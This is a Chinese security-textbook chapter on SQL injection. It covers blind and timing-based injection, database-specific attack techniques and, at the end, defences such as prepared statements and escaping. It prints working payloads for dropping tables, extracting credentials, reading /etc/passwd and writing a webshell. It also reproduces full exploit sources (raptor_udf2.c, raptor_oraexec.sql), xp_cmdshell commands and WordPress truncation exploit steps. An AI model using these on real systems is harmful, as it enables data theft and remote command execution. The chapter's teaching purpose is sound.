7.1 SQL注入在今天，SQL注入对于开发者来说，应该是耳熟能详了。而SQL注入第一次为公众所知，是在1998年的著名黑客杂志《Phrack》第54期上，一位名叫rfp的黑客发表了一篇题为“NT Web Tech-nology Vulnerabilities”的文章。在文章中，第一次向公众介绍了这种新型的攻击技巧。下面是一个SQL注入的典型例子。var Shipcity;ShipCity = Request.form ("ShipCity");var sql = "select * from OrdersTable where ShipCity = '" + ShipCity + "'";变量ShipCity的值由用户提交，在正常情况下，假如用户输入“Beijing”，那么SQL语句会执行：SELECT * FROM OrdersTable WHERE ShipCity = 'Beijing'但假如用户输入一段有语义的SQL语句，比如：Beijing'; drop table OrdersTable--那么，SQL语句在实际执行时就会如下：SELECT * FROM OrdersTable WHERE ShipCity = 'Beijing';drop table OrdersTable--'我们看到，原本正常执行的查询语句，现在变成了查询完后，再执行一个drop表的操作，而这个操作，是用户构造了恶意数据的结果。回过头来看看注入攻击的两个条件：（1）用户能够控制数据的输入——在这里，用户能够控制变量ShipCity。 （2）原本要执行的代码，拼接了用户的输入：var sql = "select * from OrdersTable where ShipCity = '" + ShipCity + "'";这个“拼接”的过程很重要，正是这个拼接的过程导致了代码的注入。在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中输入一个单引号“'”，引起执行查询语句的语法错误，服务器直接返回了错误信息：Microsoft JET Database Engine 错误 '80040e14'字符串的语法错误 在查询表达式 'ID=49'' 中。/showdetail.asp，行8从错误信息中可以知道，服务器用的是Access作为数据库，查询语句的伪代码极有可能是：select  xxx  from  table_X  where  id = $id错误回显披露了敏感信息，对于攻击者来说，构造SQL注入的语句就可以更加得心应手了。7.1.1 盲注（Blind Injection）但很多时候，Web服务器关闭了错误回显，这时就没有办法成功实施SQL注入攻击了吗？攻击者为了应对这种情况，研究出了“盲注”（Blind In-jection）的技巧。所谓“盲注”，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到执行。最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否得到执行。比如，一个应用的URL如下：http://newspaper.com/items.php?id=2执行的SQL语句为：SELECT title, description, body FROM items WHERE ID = 2如果攻击者构造如下的条件语句：http://newspaper.com/items.php?id=2 and 1=2实际执行的SQL语句就会变成：SELECT title, description, body FROM items WHERE ID = 2 and 1=2因为“and 1=2”永远是一个假命题，所以这条SQL语句的“and”条件永远无法成立。对于Web应用来说，也不会将结果返回给用户，攻击者看到的页面结果将为空或者是一个出错页面。为了进一步确认注入是否存在，攻击者还必须再次验证这个过程。因为一些处理逻辑或安全功能，在攻击者构造异常请求时，也可能会导致页面返回不正常。攻击者继续构造如下请求：http://newspaper.com/items.php?id=2 and 1=1当攻击者构造条件“and 1=1”时，如果页面正常返回了，则说明SQL语句的“and”成功执行，那么就可以判断“id”参数存在SQL注入漏洞了。在这个攻击过程中，服务器虽然关闭了错误回显，但是攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断出SQL注入漏洞是否存在。这就是盲注的工作原理。如下例：攻击者先输入条件“and 1=1”，服务器返回正常页面，这是因为“and”语句成立。当注入语句的条件为真时返回正常页面再输入条件“and 1=2”，SQL语句执行后，因为1=2永远不可能为真，因此SQL语句无法返回查询到的数据。当注入语句的条件为假时没有查询到具体内容由此可立即判断漏洞存在。7.1.2  Timing Attack2011年3月27日，一个名叫TinKode的黑客在著名的安全邮件列表Full Disclosure上公布了一些他入侵mysql.com所获得的细节。这次入侵事件，就是由一个SQL注入漏洞引起的。MySQL是当今世界上最流行的数据库软件之一。据黑客描述，这个漏洞出在下面这个页面：mysql.com存在漏洞的页面通过改变参数id的值，服务器将返回不同的客户信息。这个参数存在一个非常隐蔽的“盲注”漏洞，通过简单的条件语句比如“and 1=2”是无法看出异常的。在这里黑客用了“盲注”的一个技巧：Timing Attack，来判断漏洞的存在。在MySQL中，有一个BENCHMARK()函数，它是用于测试函数性能的。它有两个参数：BENCHMARK(count,expr)函数执行的结果，是将表达式expr执行count次。比如：mysql> SELECT BENCHMARK(1000000,ENCODE('hello','goodbye'));+----------------------------------------------+| BENCHMARK(1000000,ENCODE('hello','goodbye')) |+----------------------------------------------+|                                                     0 |+----------------------------------------------+1 row in set (4.74 sec)就将ENCODE('hello','goodbye')执行了1000000次，共用时4.74秒。因此，利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Tim-ing Attack。攻击者接下来要实施的就是利用Timing At-tack完成这次攻击，这是一个需要等待的过程。比如构造的攻击参数id值为：1170 UNION SELECT IF(SUBSTRING(current,1,1) =CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (Select Database()as current) as tbl;这段Payload判断库名的第一个字母是否为CHAR(119)，即小写的w。如果判断结果为真，则会通过BENCHMARK()函数造成较长延时；如果不为真，则该语句将很快执行完。攻击者遍历所有字母，直到将整个数据库名全部验证完成为止。与此类似，还可通过以下函数获取到许多有用信息：database() - the name of the database currently connected to.system_user() - the system user for the database.current_user() - the current user who is logged in to the database.last_insert_id() - the transaction ID of the last insert operation on the database.如果当前数据库用户（current_user）具有写权限，那么攻击者还可以将信息写入本地磁盘中。比如写入Web目录中，攻击者就有可能下载这些文件：1170 Union All SELECT table_name, table_type, engine FROM information_schema.tables WHEREtable_schema = 'mysql’ ORDER BY table_name DESC INTO OUTFILE'/path/location/on/server/www/schema.txt'此外，通过Dump文件的方法，还可以写入一个webshell：1170 UNION SELECT "",2,3,4 INTO OUTFILE"/var/www/html/temp/c.php" --Timing Attack是盲注的一种高级技巧。在不同的数据库中，都有着类似于BENCHMARK()的函数，可以被Timing Attack所利用。更多类似的函数，可以查阅每个数据库软件的手册。
7.2 数据库攻击技巧找到SQL注入漏洞，仅仅是一个开始。要实施一次完整的攻击，还有许多事情需要做。在本节中，将介绍一些具有代表性的SQL注入技巧。了解这些技巧，有助于更深入地理解SQL注入的攻击原理。SQL注入是基于数据库的一种攻击。不同的数据库有着不同的功能、不同的语法和函数，因此针对不同的数据库，SQL注入的技巧也有所不同。7.2.1 常见的攻击技巧SQL注入可以猜解出数据库的对应版本，比如下面这段Payload，如果MySQL的版本是4，则会返回TRUE：http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4下面这段Payload，则是利用union select来分别确认表名admin是否存在，列名passwd是否存在：id=5 union all select 1,2,3 from adminid=5 union all select 1,2,passwd from admin进一步，想要猜解出username和password具体的值，可以通过判断字符的范围，一步步读出来：id=5 and ascii(substring((select concat(username,0x3a,passwd) from users limit0,1),1,1))>64 /*ret true)*/id=5 and ascii(substring((select concat(username,0x3a,passwd) from users limit0,1),1,1))>96 /*ret true*/id=5 and ascii(substring((select concat(username,0x3a,passwd) from users limit0,1),1,1))>100 /*ret false*/id=5 and ascii(substring((select concat(username,0x3a,passwd) from users limit0,1),1,1))>97 /*ret false*/...id=5 and ascii(substring((select concat(username,0x3a,passwd) from users limit0,1),2,1))>64 /*ret true*/...这个过程非常的烦琐，所以非常有必要使用一个自动化工具来帮助完成整个过程。sqlmap.py就是一个非常好的自动化注入工具。sqlmap.py的攻击过程在注入攻击的过程中，常常会用到一些读写文件的技巧。比如在MySQL中，就可以通过LOAD_FILE()读取系统文件，并通过INTODUMPFILE写入本地文件。当然这要求当前数据库用户有读写系统相应文件或目录的权限。… union select 1,1, LOAD_FILE('/etc/passwd'),1,1;如果要将文件读出后，再返回结果给攻击者，则可以使用下面这个技巧：CREATE TABLE potatoes(line BLOB);UNION SELECT 1,1, HEX(LOAD_FILE('/etc/passwd')),1,1 INTO DUMPFILE '/tmp/potatoes';LOAD DATA INFILE '/tmp/potatoes' INTO TABLE potatoes;这需要当前数据库用户有创建表的权限。首先通过LOAD_FILE()将系统文件读出，再通过INTODUMPFILE将该文件写入系统中，然后通过LOAD DATA INFILE将文件导入创建的表中，最后就可以通过一般的注入技巧直接操作表数据了。除了可以使用INTO DUMPFILE外，还可以使用INTO OUTFILE，两者的区别是DUMPFILE适用于二进制文件，它会将目标文件写入同一行内；而OUTFILE则更适用于文本文件。写入文件的技巧，经常被用于导出一个Web-shell，为攻击者的进一步攻击做铺垫。因此在设计数据库安全方案时，可以禁止普通数据库用户具备操作文件的权限。7.2.2 命令执行在MySQL中，除了可以通过导出webshell间接地执行命令外，还可以利用“用户自定义函数”的技巧，即UDF（User-Defined Functions）来执行命令。在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF：CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_library在MySQL 4的服务器上，Marco Ivaldi公布了如下的代码，可以通过UDF执行系统命令。尤其是当运行mysql进程的用户为root时，将直接获得root权限。/* * $Id: raptor_udf2.c,v 1.1 2006/01/18  17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi  * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola . For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * "UDFs should have at least one symbol defined in addition to the xxx symbol * that corresponds to the main xxx() function. These auxiliary symbols * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and * xxx_add() functions". -- User Defined Functions Security Precautions * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql> use mysql; * mysql> create table foo(line blob); * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so')); * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so'; * mysql> create function do_system returns integer soname 'raptor_udf2.so'; * mysql> select * from mysql.func; * +-----------+-----+----------------+----------+ * | name | ret | dl         | type  | * +-----------+-----+----------------+----------+ * | do_system |   2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out'); * mysql> \! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] */#include #include enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};typedef struct st_udf_args { unsigned int  arg_count;   // number of arguments enum Item_result  *arg_type;   // pointer to item_result char    **args;   // pointer to arguments unsigned long  *lengths;  // length of string args char   *maybe_null;   // 1 for maybe_null args} UDF_ARGS;typedef struct st_udf_init { char   maybe_null;    // 1 if func can return NULL unsigned int  decimals;  // for real functions unsigned long   max_length;  // for string functions char   *ptr;    // free ptr for func data char   const_item;    // 0 if result is constant} UDF_INIT;int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error){ if (args->arg_count != 1)  return(0); system(args->args[0]); return(0);}char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message){ return(0);}但是这段代码在MySQL 5及之后的版本中将受到限制，因为其创建自定义函数的过程并不符合新的版本规范，且返回值永远是0。后来安全研究者们找到了另外的方法——通过lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的函数是sys_eval()和sys_exec()。在攻击过程中，将lib_mysqludf_sys.so上传到数据库能访问到的路径下。在创建UDF之后，就可以使用sys_eval()等函数执行系统命令了。 ?sys_eval，执行任意命令，并将输出返回。  sys_exec，执行任意命令，并将退出码返回。 ?sys_get，获取一个环境变量。sys_set，创建或修改一个环境变量。lib_mysqludf_sys的相关信息可以在官方网站获得，使用方法如下：$ wget --no-check-certificate https://svn.sqlmap.org/sqlmap/trunk/sqlmap/extra/mysqludfsys/lib_mysqludf_sys_0.0.3.tar.gz$ tar xfz lib_mysqludf_sys_0.0.3.tar.gz$ cd lib_mysqludf_sys_0.0.3$ sudo ./install.shCompiling the MySQL UDFgcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o/usr/lib/lib_mysqludf_sys.soMySQL UDF compiled successfullyPlease provide your MySQL root passwordEnter password:MySQL UDF installed successfully$ mysql -u root -p mysqlEnter password:[...]mysql> SELECT sys_eval('id');+--------------------------------------------------+| sys_eval('id')                   |+--------------------------------------------------+| uid=118(mysql) gid=128(mysql) groups=128(mysql) |+--------------------------------------------------+1 row in set (0.02 sec)mysql> SELECT sys_exec('touch /tmp/test_mysql');+-----------------------------------+| sys_exec('touch /tmp/test_mysql') |+-----------------------------------+| 0                    |+-----------------------------------+1 row in set (0.02 sec)mysql> exitBye$ ls -l /tmp/test_mysql-rw-rw---- 1 mysql mysql 0 2009-01-16 23:18 /tmp/test_mysql自动化注入工具sqlmap已经集成了此功能。$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --os-cmd id-v 1[...]web application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: PostgreSQL[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:12] [INFO] the back-end DBMS operating system is Linux[hh:mm:12] [INFO] testing if current user is DBA[hh:mm:12] [INFO] detecting back-end DBMS version from its banner[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF filedo you want to retrieve the command standard output? [Y/n/a] ycommand standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'[hh:mm:19] [INFO] cleaning up the database management systemdo you want to remove UDF 'sys_eval'? [Y/n] ydo you want to remove UDF 'sys_exec'? [Y/n] y[hh:mm:23] [INFO] database management system cleanup finished[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system ---- $Id: raptor_oraexec.sql,v 1.2 2006/11/23 23:40:16 raptor Exp $---- raptor_oraexec.sql - java exploitation suite for oracle-- Copyright (c) 2006 Marco Ivaldi ---- This is an exploitation suite for Oracle written in Java. Use it to-- read/write files and execute OS commands with the privileges of the-- RDBMS, if you have the required permissions (DBA role and SYS:java).---- "The Oracle RDBMS could almost be considered as a shell like bash or the-- Windows Command Prompt; it's not only capable of storing data but can also-- be used to completely access the file system and run operating system-- commands" -- David Litchfield (http://www.databasesecurity.com/)---- Usage example:-- $ sqlplus "/ as sysdba"-- [...]-- SQL> @raptor_oraexec.sql-- [...]-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l > /tmp/aaa');-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l / > /tmp/bbb');-- SQL> exec dbms_java.set_output(2000);-- SQL> set serveroutput on;-- SQL> exec javareadfile('/tmp/mytest');-- /bin/ls -l > /tmp/aaa-- /bin/ls -l / >/tmp/bbb-- SQL> exec javacmd('/bin/sh /tmp/mytest');-- SQL> !sh-- $ ls -rtl /tmp/-- [...]-- -rw-r--r--   1 oracle   system        45 Nov 22 12:20 mytest-- -rw-r--r--   1 oracle   system      1645 Nov 22 12:20 aaa-- -rw-r--r--   1 oracle   system      8267 Nov 22 12:20 bbb-- [...]--create or replace and resolve java source named "oraexec" asimport java.lang.*;import java.io.*;public class oraexec{ /*  * Command execution module  */ public static void execCommand(String command) throws IOException {  Runtime.getRuntime().exec(command); } /*  * File reading module  */ public static void readFile(String filename) throws IOException {  FileReader f = new FileReader(filename);  BufferedReader fr = new BufferedReader(f);  String text = fr.readLine();  while (text != null) {   System.out.println(text);   text = fr.readLine();  }  fr.close(); } /*  * File writing module  */ public static void writeFile(String filename, String line) throws IOException {  FileWriter f = new FileWriter(filename, true); /* append */  BufferedWriter fw = new BufferedWriter(f);  fw.write(line);  fw.write("\n");  fw.close(); }}/-- usage: exec javacmd('command');create or replace procedure javacmd(p_command varchar2) aslanguage javaname 'oraexec.execCommand(java.lang.String)';/-- usage: exec dbms_java.set_output(2000);--        set serveroutput on;--        exec javareadfile('/path/to/file');create or replace procedure javareadfile(p_filename in varchar2) aslanguage javaname 'oraexec.readFile(java.lang.String)';/-- usage: exec javawritefile('/path/to/file', 'line to append');create or replace procedure javawritefile(p_filename in varchar2, p_line in varchar2) aslanguage javaname 'oraexec.writeFile(java.lang.String, java.lang.String)';/一般来说，在数据库中执行系统命令，要求具有较高的权限。在数据库加固时，可以参阅官方文档给出的安全指导文档。在建立数据库账户时应该遵循“最小权限原则”，尽量避免给Web应用使用数据库的管理员权限。7.2.3 攻击存储过程存储过程为数据库提供了强大的功能，它与UDF很像，但存储过程必须使用CALL或者EXE-CUTE来执行。在MS SQL Server和Oracle数据库中，都有大量内置的存储过程。在注入攻击的过程中，存储过程将为攻击者提供很大的便利。在MS SQL Server中，存储过程“xp_cmd-shell”可谓是臭名昭著了，无数的黑客教程在讲到注入SQL Server时都是使用它执行系统命令：EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'EXEC master.dbo.xp_cmdshell 'ping 'xp_cmdshell在SQL Server 2000中默认是开启的，但在SQL Server 2005及以后版本中则默认被禁止了。但是如果当前数据库用户拥有sysad-min权限，则可以使用sp_configure（SQL Server2005 与 SQL Server 2008）重新开启它；如果在SQLServer 2000中禁用了xp_cmdshell，则可以使用sp_addextendedproc开启它。EXEC sp_configure 'show advanced options',1RECONFIGUREEXEC sp_configure 'xp_cmdshell',1RECONFIGURE除了xp_cmdshell外，还有一些其他的存储过程对攻击过程也是有帮助的。比如xp_regread可以操作注册表：exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'exec xp_regenumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'可以操作注册表的存储过程还有：  xp_regaddmultistringxp_regdeletekeyxp_regdeletevaluexp_regenumkeysxp_regenumvaluesxp_regreadxp_regremovemultistringxp_regwrite此外，以下存储过程对攻击者也非常有用。  xp_servicecontrol，允许用户启动、停止服务。如：(exec master..xp_servicecontrol 'start','schedule'exec master..xp_servicecontrol 'start','server')     xp_availablemedia，显示机器上有用的驱动器。xp_dirtree，允许获得一个目录树。xp_enumdsn，列举服务器上的ODBC数据源。xp_loginconfig，获取服务器安全信息。xp_makecab，允许用户在服务器上创建一个压缩文件。xp_ntsec_enumdomains，列举服务器可以进入的域。xp_terminate_process，提供进程的进程ID，终止此进程。除了利用存储过程直接攻击外，存储过程本身也可能会存在注入漏洞。我们看下面这个PL/SQL的例子。procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)is open itm_cv for ' SELECT * FROM items WHERE ' ||   'owner = '''|| usr ||   ' AND itemname = ''' || itm || '''';end get_item;在这个存储过程中，变量usr和itemname 都是由外部传入的，且未经过任何处理，将直接造成SQL注入问题。在Oracle数据库中，由于内置的存储过程非常多，很多存储过程都可能存在SQL注入问题，需要特别引起注意。7.2.4 编码问题在有些时候，不同的字符编码也可能会导致一些安全问题。在注入的历史上，曾经出现过“基于字符集”的注入攻击技巧。注入攻击中常常会用到单引号“’”、双引号“””等特殊字符。在应用中，开发者为了安全，经常会使用转义字符“\”来转义这些特殊字符。但当数据库使用了“宽字符集”时，可能会产生一些意想不到的漏洞。比如，当MySQL使用了GBK编码时，0xbf27 和 0xbf5c都会被认为是一个字符（双字节字符）。宽字符问题而在进入数据库之前，在Web语言中则没有考虑到双字节字符的问题，双字节字符会被认为是两个字节。比如PHP中的addslashes()函数，或者当magic_quotes_gpc开启时，会在特殊字符前增加一个转义字符“\”。addslashes()函数会转义4个字符： Descriptionstring addslashes ( string $str )Returns a string with backslashes before characters that need to be quoted in databasequeries etc. These characters are single quote ('), double quote ("), backslash (\) andNUL (the NULL byte).因此，假如攻击者输入：0xbf27 or 1=1即：经过转义后，会变成0xbf5c27（“\”的ASCII码为0x5c），但0xbf5c又是一个字符：因此原本会存在的转义符号“\”，在数据库中就被“吃掉“了，变成：要解决这种问题，需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。统一设置为UTF-8是一个很好的方法。基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。比如在XSS攻击时，由于浏览器与服务器返回的字符编码不同，也可能会存在字符集攻击。解决方法就是在HTML页面的标签中指定当前页面的charset。如果因为种种原因无法统一字符编码，则需要单独实现一个用于过滤或转义的安全函数，在其中需要考虑到字符的可能范围。比如，GBK编码的字符范围为：根据系统所使用的不同字符集来限制用户输入数据的字符允许范围，以实现安全过滤。7.2.5 SQL Column Truncation2008年8月，Stefan Esser提出了一种名为“SQL Column Truncation”的攻击方式，在某些情况下，将会导致发生一些安全问题。在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql-mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warn-ing，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题。测试过程如下（MySQL 5）。首先开启strict模式。sql-mode="STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"在strict模式下，因为输入的字符串超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功。mysql> create table 'truncated_test' (    -> `id` int(11) NOT NULL auto_increment,    -> `username` varchar(10) default NULL,    -> `password` varchar(10) default NULL,    -> PRIMARY KEY ('id')    -> )DEFAULT CHARSET=utf8;Query OK, 0 rows affected (0.08 sec)mysql> select * from truncated_test;Empty set (0.00 sec)mysql> show columns from truncated_test;+----------+-------------+------+-----+---------+----------------+| Field    | Type        | Null | Key | Default | Extra          |+----------+-------------+------+-----+---------+----------------+| id       | int(11)     | NO   | PRI | NULL    | auto_increment || username | varchar(10) | YES |     | NULL    |                || password | varchar(10) | YES |     | NULL    |                |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec)mysql> insert into truncated_test('username','password') values("admin","pass");Query OK, 1 row affected (0.03 sec)mysql> select * from truncated_test;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin    | pass     |+----+----------+----------+1 row in set (0.00 sec)mysql> insert into truncated_test('username','password') values("admin       x","new_pass");ERROR 1406 (22001): Data too long for column 'username' at row 1 mysql> select * from truncated_test;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin    | pass     |+----+----------+----------+1 row in set (0.00 sec)当关闭了strict选项时：sql-mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"数据库只返回一个warning信息，但数据插入成功。mysql> select * from truncated_test;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin    | pass     |+----+----------+----------+1 row in set (0.00 sec)mysql> insert into truncated_test('username','password') values("admin       x",    -> "new_pass");Query OK, 1 row affected, 1 warning (0.01 sec) mysql> select * from truncated_test;+----+------------+----------+| id | username   | password |+----+------------+----------+| 1 | admin      | pass     || 2 | admin      | new_pass |+----+------------+----------+2 rows in set (0.00 sec)mysql>此时如果插入两个相同的数据会有什么后果呢？根据不同业务可能会造成不同的逻辑问题。比如类似下面的代码：$userdata = null;if (isPasswordCorrect($username, $password)) {   $userdata = getUserDataByLogin($username);   ...}它使用这条SQL语句来验证用户名和密码：SELECT username FROM users WHERE username = ? AND passhash = ?但如果攻击者插入一个同名的数据，则可以通过此认证。在之后的授权过程中，如果系统仅仅通过用户名来进行授权：SELECT * FROM users WHERE username = ?则可能会造成一些越权访问。在这个问题公布后不久，WordPress就出现了一个真实的案例——注册一个用户名为“admin（55个空格）x”的用户，就可以修改原管理员的密码了。Vulnerable Systems:  * WordPress version 2.6.1Exploit:  1. Go to URL: server.com/wp-login.php?action=register2. Register as:login: admin x (the user admin[55 space chars]x)email: your emailNow, we have duplicated 'admin' account in database3. Go to URL: server.com/wp-login.php?action=lostpassword4. Write your email into field and submit this form5. Check your email and go to reset confirmation link6. Admin's password changed, but new password will be send to correct admin emailAdditional Information:  The information has been provided by irk4z.The original article can be found at: http://irk4z.wordpress.com/但这个漏洞并未造成严重的后果，因为攻击者在此只能修改管理员的密码，而新密码仍然会发送到管理员的邮箱。尽管如此，我们并不能忽视“SQLColumn Truncation”的危害，因为也许下一次漏洞被利用时，就没有那么好的运气了。
7.3 正确地防御SQL注入本章中分析了很多注入攻击的技巧，从防御的角度来看，要做的事情有两件：（1）找到所有的SQL注入漏洞； （2）修补这些漏洞。解决好这两个问题，就能有效地防御SQL注入攻击。SQL注入的防御并不是一件简单的事情，开发者常常会走入一些误区。比如只对用户输入做一些escape处理，这是不够的。参考如下代码：$sql = "SELECT id,name,mail,cv,blog,twitter FROM register WHEREid=".mysql_real_escape_string($_GET['id']);当攻击者构造的注入代码如下时：http://vuln.example.com/user.php?id=12,AND,1=0,union,select,1,concat(user,0x3a,password),3,4,5,6,from,mysql.user,where,user=substring_index(current_user(),char(64),1)将绕过mysql_real_escape_string的作用注入成功。这条语句执行的结果如下。因为mysql_real_escape_string()仅仅会转义：  ’“\r\nNULLControl-Z这几个字符，在本例中SQL注入所使用的Payload完全没有用到这几个字符。那是不是再增加一些过滤字符，就可以了呢？比如处理包括“空格”、“括号”在内的一些特殊字符，以及一些SQL保留字，比如SELECT、INSERT等。其实这种基于黑名单的方法，都或多或少地存在一些问题，我们看看下面的案例。注入时不需要使用空格的例子：SELECT/**/passwd/**/from/**/userSELECT(passwd)from(user)不需要括号、引号的例子，其中0x61646D696E是字符串admin的十六进制编码：SELECT passwd from users where user=0x61646D69而在SQL保留字中，像“HAVING”、“OR-DER BY”等都可能出现在自然语言中，用户提交的正常数据可能也会有这些单词，从而造成误杀，因此不能轻易过滤。那么到底该如何正确地防御SQL注入呢？7.3.1 使用预编译语句一般来说，防御SQL注入的最佳方式，就是使用预编译语句，绑定变量。比如在Java中使用预编译的SQL语句：String custname = request.getParameter("customerName"); // This should REALLY be validatedtoo // perform input validation to detect attacks String query = "SELECT account_balance FROM user_data WHERE user_name = ? "; PreparedStatement pstmt = connection.prepareStatement( query ); pstmt.setString( 1, custname);  ResultSet results = pstmt.executeQuery( );使用预编译的SQL语句，SQL语句的语义不会发生改变。在SQL语句中，变量用?表示，攻击者无法改变SQL的结构，在上面的例子中，即使攻击者插入类似于tom' or '1'='1的字符串，也只会将此字符串当做username来查询。下面是在PHP中绑定变量的示例。$query = "INSERT INTO myCity (Name, CountryCode, District) VALUES (?,?,?)";$stmt = $mysqli->prepare($query);$stmt->bind_param("sss", $val1, $val2, $val3); $val1 = 'Stuttgart';$val2 = 'DEU';$val3 = 'Baden-Wuerttemberg';/* Execute the statement */$stmt->execute();在不同的语言中，都有着使用预编译语句的方法。Java EE – use PreparedStatement() with bind variables.NET – use parameterized queries like SqlCommand() or OleDbCommand() with bind variablesPHP – use PDO with strongly typed parameterized queries (using bindParam())Hibernate - use createQuery() with bind variables (called named parameters in Hibernate)SQLite - use sqlite3_prepare() to create a statement object7.3.2 使用存储过程除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将SQL语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。下面是一个在Java中调用存储过程的例子，其中sp_getAccountBalance是预先在数据库中定义好的存储过程。String custname = request.getParameter("customerName"); // This should REALLY be validated try {     CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");     cs.setString(1, custname);      ResultSet results = cs.executeQuery();     // … result set handling } catch (SQLException se) {    // … logging and error handling }但是有的时候，可能无法使用预编译语句或存储过程，该怎么办？这时候只能再次回到输入过滤和编码等方法上来。7.3.3 检查数据类型检查输入数据的数据类型，在很大程度上可以对抗SQL注入。比如下面这段代码，就限制了输入数据的类型只能为integer，在这种情况下，也是无法注入成功的。其他的数据格式或类型检查也是有益的。比如用户在输入邮箱时，必须严格按照邮箱的格式；输入时间、日期时，必须严格按照时间、日期的格式，等等，都能避免用户数据造成破坏。但数据类型检查并非万能，如果需求就是需要用户提交字符串，比如一段短文，则需要依赖其他的方法防范SQL注入。7.3.4 使用安全函数一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入。但前文曾举了一些编码函数被绕过的例子，因此我们需要一个足够安全的编码函数。幸运的是，数据库厂商往往都对此做出了“指导”。比如在MySQL中，需要按照以下思路编码字符：NUL (0x00) --> \0  [This is a zero, not the letter O] BS  (0x08) --> \b TAB (0x09) --> \t LF  (0x0a) --> \n CR  (0x0d) --> \r SUB (0x1a) --> \z "   (0x22) --> \" %   (0x25) --> \%  '   (0x27) --> \' \   (0x5c) --> \\ _   (0x5f) --> \_ all other non-alphanumeric characters with ASCII values less than 256  --> \c where 'c' is the original non-alphanumeric character.同时，可以参考OWASP ESAPI中的实现。这个函数由安全专家编写，更值得信赖。ESAPI.encoder().encodeForSQL( new OracleCodec(), queryparam );在使用时：Codec ORACLE_CODEC = new OracleCodec(); String query = "SELECT user_id FROM user_data WHERE user_name = '" +ESAPI.encoder().encodeForSQL( ORACLE_CODEC, req.getParameter("userID")) + "' and user_password = '"   + ESAPI.encoder().encodeForSQL( ORACLE_CODEC, req.getParameter("pwd")) 